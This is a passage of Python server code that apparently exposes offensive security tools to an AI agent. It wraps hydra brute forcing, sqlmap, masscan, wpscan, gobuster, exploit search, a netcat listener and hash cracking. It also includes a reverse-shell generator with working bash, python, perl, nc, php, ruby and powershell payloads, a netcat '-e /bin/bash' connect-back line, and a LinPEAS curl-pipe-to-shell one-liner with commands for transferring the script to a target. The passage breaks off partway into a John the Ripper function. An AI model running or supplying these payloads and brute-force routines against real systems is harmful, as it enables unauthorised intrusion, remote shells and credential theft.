        password_list = params.get("password_list", "/usr/share/wordlists/rockyou.txt")
        port = params.get("port")

        if not all([target, service]):
            return ToolResponse(
                tool="hydra_brute_force",
                status="error",
                error="Target and service are required",
            )

        # Build hydra command
        command = [
            "hydra",
            "-t",
            "4",  # 4 threads
            "-f",  # Exit on first found
            "-v",  # Verbose
        ]

        if username:
            command.extend(["-l", username])
        else:
            command.extend(
                ["-L", "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"]
            )

        command.extend(["-P", password_list])

        if port:
            command.extend(["-s", str(port)])

        command.extend([target, service])

        logger.info(f"Executing hydra command: {' '.join(command)}")

        # Execute the command (with shorter timeout)
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command,
            command,
            timeout=120,  # 2 minutes max
        )

        # Parse results
        credentials_found = []
        if stdout:
            for line in stdout.split("\n"):
                if (
                    "[" + service + "]" in line
                    and "login:" in line
                    and "password:" in line
                ):
                    # Extract credentials
                    parts = line.split()
                    for i, part in enumerate(parts):
                        if part == "login:" and i + 1 < len(parts):
                            login = parts[i + 1]
                        if part == "password:" and i + 1 < len(parts):
                            pwd = parts[i + 1]
                    credentials_found.append({"username": login, "password": pwd})

        return ToolResponse(
            tool="hydra_brute_force",
            status="success",
            result={
                "credentials_found": credentials_found,
                "output": stdout[-5000:],  # Last 5000 chars
                "command": " ".join(command),
            },
            metadata={
                "target": target,
                "service": service,
                "success": len(credentials_found) > 0,
            },
        )

    except Exception as e:
        logger.error(f"Error in hydra_brute_force: {e}")
        return ToolResponse(tool="hydra_brute_force", status="error", error=str(e))


# ===== Exploit Search Tools =====


@app.post("/tools/searchsploit_query", response_model=ToolResponse)
async def searchsploit_query(request: ToolRequest):
    """Search for exploits using searchsploit."""
    try:
        params = request.parameters
        query = params.get("query")
        exact_match = params.get("exact_match", False)

        if not query:
            return ToolResponse(
                tool="searchsploit_query", status="error", error="Query is required"
            )

        # Build searchsploit command
        command = ["searchsploit", "--json"]

        if exact_match:
            command.append("-e")

        command.extend(query.split())

        logger.info(f"Executing searchsploit command: {' '.join(command)}")

        # Execute the command
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, command, timeout=30
        )

        # Parse JSON results
        exploits = []
        if stdout:
            try:
                data = json.loads(stdout)
                for exploit in data.get("RESULTS_EXPLOIT", []):
                    exploits.append(
                        {
                            "title": exploit.get("Title"),
                            "path": exploit.get("Path"),
                            "date": exploit.get("Date"),
                            "type": exploit.get("Type"),
                            "platform": exploit.get("Platform"),
                        }
                    )
            except json.JSONDecodeError:
                pass

        return ToolResponse(
            tool="searchsploit_query",
            status="success",
            result={
                "exploits": exploits[:50],  # Limit to 50 results
                "total_found": len(exploits),
                "command": " ".join(command),
            },
            metadata={"query": query, "exact_match": exact_match},
        )

    except Exception as e:
        logger.error(f"Error in searchsploit_query: {e}")
        return ToolResponse(tool="searchsploit_query", status="error", error=str(e))


@app.post("/tools/searchsploit_detail", response_model=ToolResponse)
async def searchsploit_detail(request: ToolRequest):
    """Get detailed information about a specific exploit."""
    try:
        params = request.parameters
        exploit_path = params.get("exploit_path")

        if not exploit_path:
            return ToolResponse(
                tool="searchsploit_detail",
                status="error",
                error="Exploit path is required",
            )

        # Build searchsploit command
        command = ["searchsploit", "-x", exploit_path]

        logger.info(f"Executing searchsploit detail command: {' '.join(command)}")

        # Execute the command
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, command, timeout=30
        )

        return ToolResponse(
            tool="searchsploit_detail",
            status="success",
            result={
                "content": stdout[:10000],  # Limit to 10k chars
                "path": exploit_path,
                "command": " ".join(command),
            },
            metadata={"exploit_path": exploit_path},
        )

    except Exception as e:
        logger.error(f"Error in searchsploit_detail: {e}")
        return ToolResponse(tool="searchsploit_detail", status="error", error=str(e))


@app.post("/tools/suggest_exploits_for_services", response_model=ToolResponse)
async def suggest_exploits_for_services(request: ToolRequest):
    """Suggest exploits based on discovered services."""
    try:
        params = request.parameters
        services = params.get("services", [])

        if not services:
            return ToolResponse(
                tool="suggest_exploits_for_services",
                status="error",
                error="Services list is required",
            )

        all_suggestions = []

        for service in services:
            service_name = service.get("name", "")
            version = service.get("version", "")

            if service_name:
                # Search for exploits
                query = f"{service_name} {version}".strip()
                command = ["searchsploit", "--json", query]

                stdout, stderr, returncode = await asyncio.to_thread(
                    run_command, command, timeout=30
                )

                if stdout:
                    try:
                        data = json.loads(stdout)
                        exploits = data.get("RESULTS_EXPLOIT", [])
                        if exploits:
                            all_suggestions.append(
                                {
                                    "service": service,
                                    "exploits": [
                                        {
                                            "title": e.get("Title"),
                                            "path": e.get("Path"),
                                            "date": e.get("Date"),
                                        }
                                        for e in exploits[:5]  # Top 5 per service
                                    ],
                                }
                            )
                    except json.JSONDecodeError:
                        pass

        return ToolResponse(
            tool="suggest_exploits_for_services",
            status="success",
            result={
                "suggestions": all_suggestions,
                "total_services_checked": len(services),
                "services_with_exploits": len(all_suggestions),
            },
            metadata={"services_count": len(services)},
        )

    except Exception as e:
        logger.error(f"Error in suggest_exploits_for_services: {e}")
        return ToolResponse(
            tool="suggest_exploits_for_services", status="error", error=str(e)
        )


# ===== Custom AlienRecon Functions =====


@app.post("/tools/create_plan", response_model=ToolResponse)
async def create_plan(request: ToolRequest):
    """Create a multi-step reconnaissance plan."""
    try:
        params = request.parameters
        plan_steps = params.get("plan_steps", [])
        plan_name = params.get("plan_name", "Reconnaissance Plan")

        if not plan_steps:
            return ToolResponse(
                tool="create_plan", status="error", error="Plan steps are required"
            )

        # Format the plan
        formatted_plan = {
            "name": plan_name,
            "created_at": datetime.now().isoformat(),
            "steps": [],
        }

        for i, step in enumerate(plan_steps, 1):
            formatted_plan["steps"].append(
                {
                    "step_number": i,
                    "description": step.get("description", ""),
                    "tool": step.get("tool", ""),
                    "parameters": step.get("parameters", {}),
                    "depends_on": step.get("depends_on", []),
                }
            )

        return ToolResponse(
            tool="create_plan",
            status="success",
            result=formatted_plan,
            metadata={"total_steps": len(plan_steps)},
        )

    except Exception as e:
        logger.error(f"Error in create_plan: {e}")
        return ToolResponse(tool="create_plan", status="error", error=str(e))


@app.post("/tools/get_plan_status", response_model=ToolResponse)
async def get_plan_status(request: ToolRequest):
    """Get the status of an existing plan."""
    try:
        params = request.parameters
        plan_id = params.get("plan_id")

        if not plan_id:
            return ToolResponse(
                tool="get_plan_status", status="error", error="Plan ID is required"
            )

        # Mock implementation - in real implementation, this would check a database
        return ToolResponse(
            tool="get_plan_status",
            status="success",
            result={
                "plan_id": plan_id,
                "status": "in_progress",
                "completed_steps": 2,
                "total_steps": 5,
                "current_step": "Running service detection scan",
            },
            metadata={"plan_id": plan_id},
        )

    except Exception as e:
        logger.error(f"Error in get_plan_status: {e}")
        return ToolResponse(tool="get_plan_status", status="error", error=str(e))


@app.post("/tools/http_fetch", response_model=ToolResponse)
async def http_fetch(request: ToolRequest):
    """Fetch and analyze HTTP/HTTPS content."""
    try:
        params = request.parameters
        url = params.get("url")
        headers = params.get("headers", {})
        follow_redirects = params.get("follow_redirects", True)

        if not url:
            return ToolResponse(
                tool="http_fetch", status="error", error="URL is required"
            )

        # Build curl command
        command = [
            "curl",
            "-s",  # Silent
            "-S",  # Show errors
            "-i",  # Include headers
            "-m",
            "30",  # 30 second timeout
        ]

        if follow_redirects:
            command.append("-L")

        # Add custom headers
        for key, value in headers.items():
            command.extend(["-H", f"{key}: {value}"])

        command.append(url)

        logger.info(f"Executing curl command: {' '.join(command)}")

        # Execute the command
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, command, timeout=35
        )

        # Parse response
        response_parts = stdout.split("\r\n\r\n", 1)
        headers_text = response_parts[0] if response_parts else ""
        body = response_parts[1] if len(response_parts) > 1 else ""

        # Extract key information
        status_code = None
        response_headers = {}

        for line in headers_text.split("\n"):
            if line.startswith("HTTP/"):
                parts = line.split()
                if len(parts) >= 2:
                    status_code = parts[1]
            elif ":" in line:
                key, value = line.split(":", 1)
                response_headers[key.strip()] = value.strip()

        return ToolResponse(
            tool="http_fetch",
            status="success",
            result={
                "url": url,
                "status_code": status_code,
                "headers": response_headers,
                "body": body[:10000],  # Limit body to 10k chars
                "body_length": len(body),
            },
            metadata={"url": url, "follow_redirects": follow_redirects},
        )

    except Exception as e:
        logger.error(f"Error in http_fetch: {e}")
        return ToolResponse(tool="http_fetch", status="error", error=str(e))


@app.post("/tools/masscan", response_model=ToolResponse)
async def masscan(request: ToolRequest):
    """Execute masscan for ultra-fast port scanning."""
    try:
        params = request.parameters
        target = params.get("target")
        ports = params.get("ports", "1-65535")
        rate = params.get("rate", 1000)

        if not target:
            return ToolResponse(
                tool="masscan", status="error", error="Target is required"
            )

        # Build masscan command
        command = [
            "masscan",
            target,
            "-p",
            str(ports),
            "--rate",
            str(rate),
            "--wait",
            "0",
        ]

        logger.info(f"Executing masscan command: {' '.join(command)}")

        # Execute the command
        start_time = datetime.now()
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, command, timeout=300
        )
        execution_time = (datetime.now() - start_time).total_seconds()

        # Parse output
        open_ports = []
        for line in stdout.split("\n"):
            if "Discovered open port" in line:
                parts = line.split()
                if len(parts) >= 6:
                    port_info = parts[3].split("/")
                    open_ports.append(
                        {
                            "port": int(port_info[0]),
                            "protocol": port_info[1],
                            "ip": parts[5],
                        }
                    )

        return ToolResponse(
            tool="masscan",
            status="success",
            result={
                "raw_output": stdout,
                "open_ports": open_ports,
                "summary": f"Found {len(open_ports)} open ports",
                "command": " ".join(command),
            },
            metadata={
                "execution_time": execution_time,
                "target": target,
                "rate": rate,
            },
        )

    except Exception as e:
        logger.error(f"Error in masscan: {e}")
        return ToolResponse(tool="masscan", status="error", error=str(e))


@app.post("/tools/python_http_server", response_model=ToolResponse)
async def python_http_server(request: ToolRequest):
    """Start a Python HTTP server for file transfers."""
    try:
        params = request.parameters
        port = params.get("port", 8000)
        directory = params.get("directory", ".")

        # Build command to start HTTP server
        command = ["python3", "-m", "http.server", str(port), "--directory", directory]

        logger.info(f"Starting HTTP server on port {port} in directory {directory}")

        # Start the server in background (non-blocking)
        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )

        # Give it a moment to start
        await asyncio.sleep(1)

        # Check if process is still running
        if process.poll() is not None:
            stderr = process.stderr.read()
            return ToolResponse(
                tool="python_http_server",
                status="error",
                error=f"Failed to start server: {stderr}",
            )

        return ToolResponse(
            tool="python_http_server",
            status="success",
            result={
                "message": f"HTTP server started on port {port}",
                "url": f"http://0.0.0.0:{port}",
                "directory": directory,
                "pid": process.pid,
                "stop_command": f"kill {process.pid}",
            },
            metadata={"port": port, "directory": directory},
        )

    except Exception as e:
        logger.error(f"Error in python_http_server: {e}")
        return ToolResponse(tool="python_http_server", status="error", error=str(e))


@app.post("/tools/netcat_listener", response_model=ToolResponse)
async def netcat_listener(request: ToolRequest):
    """Start a netcat listener for reverse shells."""
    try:
        params = request.parameters
        port = params.get("port", 4444)

        # Build netcat command
        command = ["nc", "-lvnp", str(port)]

        logger.info(f"Starting netcat listener on port {port}")

        # Start listener in background
        process = subprocess.Popen(
            command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )

        # Give it a moment to start
        await asyncio.sleep(1)

        # Check if process is still running
        if process.poll() is not None:
            stderr = process.stderr.read()
            return ToolResponse(
                tool="netcat_listener",
                status="error",
                error=f"Failed to start listener: {stderr}",
            )

        return ToolResponse(
            tool="netcat_listener",
            status="success",
            result={
                "message": f"Netcat listener started on port {port}",
                "command": " ".join(command),
                "pid": process.pid,
                "stop_command": f"kill {process.pid}",
                "connect_back": f"nc YOUR_IP {port} -e /bin/bash",
            },
            metadata={"port": port},
        )

    except Exception as e:
        logger.error(f"Error in netcat_listener: {e}")
        return ToolResponse(tool="netcat_listener", status="error", error=str(e))


@app.post("/tools/gobuster", response_model=ToolResponse)
async def gobuster(request: ToolRequest):
    """Execute gobuster for directory/file brute-forcing."""
    try:
        params = request.parameters
        url = params.get("url")
        mode = params.get("mode", "dir")  # dir, dns, vhost
        wordlist = params.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
        extensions = params.get("extensions", "")
        threads = params.get("threads", 10)

        if not url:
            return ToolResponse(
                tool="gobuster", status="error", error="URL is required"
            )

        # Build gobuster command
        command = ["gobuster", mode, "-u", url, "-w", wordlist, "-t", str(threads)]

        if extensions and mode == "dir":
            command.extend(["-x", extensions])

        if mode == "dns":
            command.extend(["-d", url])  # domain instead of URL for DNS mode

        logger.info(f"Executing gobuster command: {' '.join(command)}")

        # Execute the command
        start_time = datetime.now()
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, command, timeout=600
        )
        execution_time = (datetime.now() - start_time).total_seconds()

        # Parse results
        found_items = []
        for line in stdout.split("\n"):
            if line.strip() and not line.startswith("["):
                found_items.append(line.strip())

        return ToolResponse(
            tool="gobuster",
            status="success",
            result={
                "raw_output": stdout,
                "found_items": found_items[:100],  # Limit to first 100
                "total_found": len(found_items),
                "command": " ".join(command),
            },
            metadata={
                "execution_time": execution_time,
                "url": url,
                "mode": mode,
                "wordlist": wordlist,
            },
        )

    except Exception as e:
        logger.error(f"Error in gobuster: {e}")
        return ToolResponse(tool="gobuster", status="error", error=str(e))


@app.post("/tools/wpscan", response_model=ToolResponse)
async def wpscan(request: ToolRequest):
    """Execute WPScan for WordPress vulnerability scanning."""
    try:
        params = request.parameters
        url = params.get("url")
        enumerate = params.get(
            "enumerate", "vp,vt,u"
        )  # vulnerable plugins, themes, users

        if not url:
            return ToolResponse(tool="wpscan", status="error", error="URL is required")

        # Build wpscan command
        command = ["wpscan", "--url", url, "--enumerate", enumerate, "--no-banner"]

        logger.info(f"Executing wpscan command: {' '.join(command)}")

        # Execute the command
        start_time = datetime.now()
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, command, timeout=600
        )
        execution_time = (datetime.now() - start_time).total_seconds()

        # Parse for vulnerabilities
        vulnerabilities = []
        users = []
        plugins = []

        for line in stdout.split("\n"):
            if "[!]" in line and "Title:" in line:
                vulnerabilities.append(line.strip())
            elif "Username:" in line:
                users.append(line.strip())
            elif "Name:" in line and "plugins" in stdout[: stdout.index(line)]:
                plugins.append(line.strip())

        return ToolResponse(
            tool="wpscan",
            status="success",
            result={
                "raw_output": stdout,
                "vulnerabilities": vulnerabilities,
                "users": users,
                "plugins": plugins,
                "summary": {
                    "vulnerabilities_found": len(vulnerabilities),
                    "users_found": len(users),
                    "plugins_found": len(plugins),
                },
                "command": " ".join(command),
            },
            metadata={
                "execution_time": execution_time,
                "url": url,
            },
        )

    except Exception as e:
        logger.error(f"Error in wpscan: {e}")
        return ToolResponse(tool="wpscan", status="error", error=str(e))


@app.post("/tools/sqlmap", response_model=ToolResponse)
async def sqlmap(request: ToolRequest):
    """Execute sqlmap for SQL injection testing."""
    try:
        params = request.parameters
        url = params.get("url")
        data = params.get("data")  # POST data
        cookie = params.get("cookie")
        level = params.get("level", 1)  # 1-5
        risk = params.get("risk", 1)  # 1-3

        if not url:
            return ToolResponse(tool="sqlmap", status="error", error="URL is required")

        # Build sqlmap command
        command = [
            "sqlmap",
            "-u",
            url,
            "--batch",
            "--level",
            str(level),
            "--risk",
            str(risk),
        ]

        if data:
            command.extend(["--data", data])

        if cookie:
            command.extend(["--cookie", cookie])

        logger.info(f"Executing sqlmap command: {' '.join(command)}")

        # Execute the command
        start_time = datetime.now()
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command,
            command,
            timeout=900,  # 15 minutes
        )
        execution_time = (datetime.now() - start_time).total_seconds()

        # Parse for SQL injection findings
        injectable = "is vulnerable" in stdout or "Parameter:" in stdout
        dbms = None

        for line in stdout.split("\n"):
            if "back-end DBMS:" in line:
                dbms = line.split(":")[-1].strip()
                break

        return ToolResponse(
            tool="sqlmap",
            status="success",
            result={
                "raw_output": stdout[-5000:],  # Last 5000 chars
                "injectable": injectable,
                "dbms": dbms,
                "summary": f"SQL Injection {'found' if injectable else 'not found'}",
                "command": " ".join(command),
            },
            metadata={
                "execution_time": execution_time,
                "url": url,
                "level": level,
                "risk": risk,
            },
        )

    except Exception as e:
        logger.error(f"Error in sqlmap: {e}")
        return ToolResponse(tool="sqlmap", status="error", error=str(e))


@app.post("/tools/reverse_shell_generator", response_model=ToolResponse)
async def reverse_shell_generator(request: ToolRequest):
    """Generate various reverse shell payloads."""
    try:
        params = request.parameters
        lhost = params.get("lhost", "10.10.10.10")
        lport = params.get("lport", 4444)
        shell_type = params.get("shell_type", "bash")

        shells = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
            "perl": f'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "nc_traditional": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "php": f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
            "ruby": f'ruby -rsocket -e\'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
            "powershell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        }

        # Get specific shell or all
        if shell_type == "all":
            result_shells = shells
        else:
            result_shells = {shell_type: shells.get(shell_type, shells["bash"])}

        # URL encode versions
        import urllib.parse

        url_encoded = {k: urllib.parse.quote(v) for k, v in result_shells.items()}

        return ToolResponse(
            tool="reverse_shell_generator",
            status="success",
            result={
                "shells": result_shells,
                "url_encoded": url_encoded,
                "listener_command": f"nc -lvnp {lport}",
                "upgrade_shell": "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
            },
            metadata={"lhost": lhost, "lport": lport},
        )

    except Exception as e:
        logger.error(f"Error in reverse_shell_generator: {e}")
        return ToolResponse(
            tool="reverse_shell_generator", status="error", error=str(e)
        )


@app.post("/tools/linpeas", response_model=ToolResponse)
async def linpeas(request: ToolRequest):
    """Download and prepare LinPEAS for privilege escalation enumeration."""
    try:
        params = request.parameters
        output_dir = params.get("output_dir", "/tmp")

        # Download LinPEAS
        linpeas_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"

        command = ["wget", "-O", f"{output_dir}/linpeas.sh", linpeas_url]

        logger.info(f"Downloading LinPEAS: {' '.join(command)}")

        # Download the script
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, command, timeout=60
        )

        if returncode != 0:
            return ToolResponse(
                tool="linpeas",
                status="error",
                error=f"Failed to download LinPEAS: {stderr}",
            )

        # Make it executable
        chmod_command = ["chmod", "+x", f"{output_dir}/linpeas.sh"]
        await asyncio.to_thread(run_command, chmod_command)

        # Prepare transfer commands
        transfer_commands = {
            "python_server": f"python3 -m http.server 8000 --directory {output_dir}",
            "target_download": "wget http://YOUR_IP:8000/linpeas.sh",
            "target_curl": "curl http://YOUR_IP:8000/linpeas.sh -o linpeas.sh",
            "target_run": "chmod +x linpeas.sh && ./linpeas.sh",
        }

        return ToolResponse(
            tool="linpeas",
            status="success",
            result={
                "message": "LinPEAS downloaded successfully",
                "location": f"{output_dir}/linpeas.sh",
                "transfer_commands": transfer_commands,
                "one_liner": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            },
            metadata={"output_dir": output_dir},
        )

    except Exception as e:
        logger.error(f"Error in linpeas: {e}")
        return ToolResponse(tool="linpeas", status="error", error=str(e))


@app.post("/tools/rustscan", response_model=ToolResponse)
async def rustscan(request: ToolRequest):
    """Execute RustScan for ultra-fast port scanning with service detection."""
    try:
        params = request.parameters
        target = params.get("target")
        ports = params.get("ports")
        ulimit = params.get("ulimit", 5000)
        batch_size = params.get("batch_size", 8000)
        timeout = params.get("timeout", 3000)

        if not target:
            return ToolResponse(
                tool="rustscan", status="error", error="Target is required"
            )

        # Build rustscan command
        command = [
            "rustscan",
            "-a",
            target,
            "-u",
            str(ulimit),
            "-b",
            str(batch_size),
            "-t",
            str(timeout),
        ]

        # Add port specification if provided
        if ports:
            command.extend(["-p", str(ports)])

        # Add greppable output
        command.append("-g")

        logger.info(f"Executing rustscan command: {' '.join(command)}")

        # Execute the command
        start_time = datetime.now()
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command, command, timeout=120
        )
        execution_time = (datetime.now() - start_time).total_seconds()

        # Parse greppable output
        open_ports = []
        for line in stdout.split("\n"):
            if " -> " in line and "[" in line:
                # Format: Host is up, received syn-ack (0.0011s latency).
                # 192.168.1.1 -> [80,443,8080]
                try:
                    parts = line.split(" -> ")
                    if len(parts) == 2:
                        ports_str = parts[1].strip()[1:-1]  # Remove brackets
                        port_list = [
                            int(p.strip()) for p in ports_str.split(",") if p.strip()
                        ]
                        for port in port_list:
                            open_ports.append({"port": port, "ip": parts[0].strip()})
                except Exception:
                    pass

        # Prepare nmap command for service detection
        nmap_command = None
        if open_ports:
            port_list = ",".join(str(p["port"]) for p in open_ports)
            nmap_command = f"nmap -sV -sC -p{port_list} {target}"

        return ToolResponse(
            tool="rustscan",
            status="success",
            result={
                "raw_output": stdout,
                "open_ports": open_ports,
                "summary": f"Found {len(open_ports)} open ports on {target}",
                "command": " ".join(command),
                "follow_up_nmap": nmap_command,
            },
            metadata={
                "execution_time": execution_time,
                "target": target,
                "ulimit": ulimit,
            },
        )

    except Exception as e:
        logger.error(f"Error in rustscan: {e}")
        return ToolResponse(tool="rustscan", status="error", error=str(e))


@app.post("/tools/feroxbuster", response_model=ToolResponse)
async def feroxbuster(request: ToolRequest):
    """Execute feroxbuster for fast content discovery."""
    try:
        params = request.parameters
        url = params.get("url")
        wordlist = params.get(
            "wordlist", "/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"
        )
        extensions = params.get("extensions")
        threads = params.get("threads", 50)
        status_codes = params.get("status_codes", "200,204,301,302,307,401,403")
        recursion_depth = params.get("recursion_depth", 4)

        if not url:
            return ToolResponse(
                tool="feroxbuster", status="error", error="URL is required"
            )

        # Build feroxbuster command
        command = ["feroxbuster", "-u", url, "-w", wordlist, "-t", str(threads)]

        # Add status codes
        command.extend(["-s", status_codes])

        # Add recursion depth
        command.extend(["-d", str(recursion_depth)])

        # Add extensions if specified
        if extensions:
            command.extend(["-x", extensions])

        # Output format
        command.extend(["--json", "--quiet"])

        logger.info(f"Executing feroxbuster command: {' '.join(command)}")

        # Execute the command
        start_time = datetime.now()
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command,
            command,
            timeout=600,  # 10 minutes
        )
        execution_time = (datetime.now() - start_time).total_seconds()

        # Parse JSON output
        discovered_paths = []
        for line in stdout.split("\n"):
            if line.strip():
                try:
                    data = json.loads(line)
                    if data.get("type") == "response":
                        discovered_paths.append(
                            {
                                "url": data.get("url"),
                                "status": data.get("status"),
                                "length": data.get("content_length"),
                                "lines": data.get("line_count"),
                                "words": data.get("word_count"),
                            }
                        )
                except json.JSONDecodeError:
                    pass

        # Create summary
        summary = {
            "total_discovered": len(discovered_paths),
            "by_status": {},
        }
        for path in discovered_paths:
            status = str(path.get("status", "unknown"))
            summary["by_status"][status] = summary["by_status"].get(status, 0) + 1

        return ToolResponse(
            tool="feroxbuster",
            status="success",
            result={
                "raw_output": stdout,
                "discovered_paths": discovered_paths[:100],  # Limit to first 100
                "summary": summary,
                "command": " ".join(command),
            },
            metadata={
                "execution_time": execution_time,
                "url": url,
                "wordlist": wordlist,
            },
        )

    except Exception as e:
        logger.error(f"Error in feroxbuster: {e}")
        return ToolResponse(tool="feroxbuster", status="error", error=str(e))


@app.post("/tools/wfuzz", response_model=ToolResponse)
async def wfuzz(request: ToolRequest):
    """Execute wfuzz for web application fuzzing."""
    try:
        params = request.parameters
        url = params.get("url")
        wordlist = params.get(
            "wordlist", "/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"
        )
        hide_codes = params.get("hide_codes", "404")
        hide_regex = params.get("hide_regex")
        threads = params.get("threads", 10)
        headers = params.get("headers", {})

        if not url:
            return ToolResponse(tool="wfuzz", status="error", error="URL is required")

        if "FUZZ" not in url:
            return ToolResponse(
                tool="wfuzz", status="error", error="URL must contain FUZZ keyword"
            )

        # Build wfuzz command
        command = ["wfuzz", "-c", "-z", f"file,{wordlist}", "-t", str(threads)]

        # Add hide codes
        if hide_codes:
            command.extend(["--hc", hide_codes])

        # Add hide regex
        if hide_regex:
            command.extend(["--hr", hide_regex])

        # Add headers
        for header, value in headers.items():
            command.extend(["-H", f"{header}: {value}"])

        # Add URL
        command.append(url)

        logger.info(f"Executing wfuzz command: {' '.join(command)}")

        # Execute the command
        start_time = datetime.now()
        stdout, stderr, returncode = await asyncio.to_thread(
            run_command,
            command,
            timeout=600,  # 10 minutes
        )
        execution_time = (datetime.now() - start_time).total_seconds()

        # Parse output
        results = []
        for line in stdout.split("\n"):
            # Wfuzz format: 000000001:   200        10 L	     29 W	    289 Ch	  "index"
            if line.strip() and line.startswith("0"):
                parts = line.split()
                if len(parts) >= 7:
                    try:
                        results.append(
                            {
                                "id": parts[0].rstrip(":"),
                                "status": int(parts[1]),
                                "lines": int(parts[2]),
                                "words": int(parts[4]),
                                "chars": int(parts[6]),
                                "payload": parts[8].strip('"')
                                if len(parts) > 8
                                else "",
                            }
                        )
                    except (ValueError, IndexError):
                        pass

        return ToolResponse(
            tool="wfuzz",
            status="success",
            result={
                "raw_output": stdout,
                "results": results[:100],  # Limit to first 100
                "summary": f"Found {len(results)} results",
                "command": " ".join(command),
            },
            metadata={
                "execution_time": execution_time,
                "url": url,
                "wordlist": wordlist,
            },
        )

    except Exception as e:
        logger.error(f"Error in wfuzz: {e}")
        return ToolResponse(tool="wfuzz", status="error", error=str(e))


@app.post("/tools/hash_identifier", response_model=ToolResponse)
async def hash_identifier(request: ToolRequest):
    """Identify hash types for password cracking."""
    try:
        params = request.parameters
        hash_value = params.get("hash")

        if not hash_value:
            return ToolResponse(
                tool="hash_identifier", status="error", error="Hash value is required"
            )

        # Common hash patterns
        hash_patterns = {
            32: ["MD5", "MD4", "LM", "NTLM"],
            40: ["SHA1", "MySQL5", "MySQL323"],
            64: ["SHA256", "SHA3-256"],
            96: ["SHA384", "SHA3-384"],
            128: ["SHA512", "SHA3-512", "Whirlpool"],
            56: ["SHA224", "SHA3-224"],
        }

        # Special patterns
        hash_info = {
            "identified_types": [],
            "hash_length": len(hash_value),
            "hash_format": "",
            "john_format": "",
            "hashcat_mode": "",
        }

        # Check length-based patterns
        if len(hash_value) in hash_patterns:
            hash_info["identified_types"] = hash_patterns[len(hash_value)]

        # Check specific patterns
        if hash_value.startswith("$1$"):
            hash_info["identified_types"] = ["MD5 Crypt"]
            hash_info["john_format"] = "md5crypt"
            hash_info["hashcat_mode"] = "500"
        elif (
            hash_value.startswith("$2a$")
            or hash_value.startswith("$2b$")
            or hash_value.startswith("$2y$")
        ):
            hash_info["identified_types"] = ["bcrypt"]
            hash_info["john_format"] = "bcrypt"
            hash_info["hashcat_mode"] = "3200"
        elif hash_value.startswith("$5$"):
            hash_info["identified_types"] = ["SHA256 Crypt"]
            hash_info["john_format"] = "sha256crypt"
            hash_info["hashcat_mode"] = "7400"
        elif hash_value.startswith("$6$"):
            hash_info["identified_types"] = ["SHA512 Crypt"]
            hash_info["john_format"] = "sha512crypt"
            hash_info["hashcat_mode"] = "1800"
        elif ":" in hash_value:
            parts = hash_value.split(":")
            if len(parts[0]) == 32:
                hash_info["identified_types"].append("NTLM (with username)")
                hash_info["john_format"] = "nt"
                hash_info["hashcat_mode"] = "1000"

        # Crack commands
        crack_commands = {
            "john": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
            "hashcat": f"hashcat -m {hash_info.get('hashcat_mode', '0')} -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
        }

        if hash_info["john_format"]:
            crack_commands["john"] = (
                f"john --format={hash_info['john_format']} --wordlist=/usr/share/wordlists/rockyou.txt hash.txt"
            )

        return ToolResponse(
            tool="hash_identifier",
            status="success",
            result={
                "hash_info": hash_info,
                "crack_commands": crack_commands,
                "tips": [
                    "Save the hash to a file (e.g., hash.txt) before cracking",
                    "For salted hashes, ensure proper format (e.g., user:hash)",
                    "Consider using rules with John: --rules=best64",
                    "For hashcat, use -O flag for optimized kernels",
                ],
            },
            metadata={"hash_length": len(hash_value)},
        )

    except Exception as e:
        logger.error(f"Error in hash_identifier: {e}")
        return ToolResponse(tool="hash_identifier", status="error", error=str(e))


@app.post("/tools/john_the_ripper", response_model=ToolResponse)
async def john_the_ripper(request: ToolRequest):
    """Execute John the Ripper for password cracking."""
    try:
        params = request.parameters
        hash_file = params.get("hash_file")
        wordlist = params.get("wordlist", "/usr/share/wordlists/rockyou.txt")
        format_type = params.get("format")
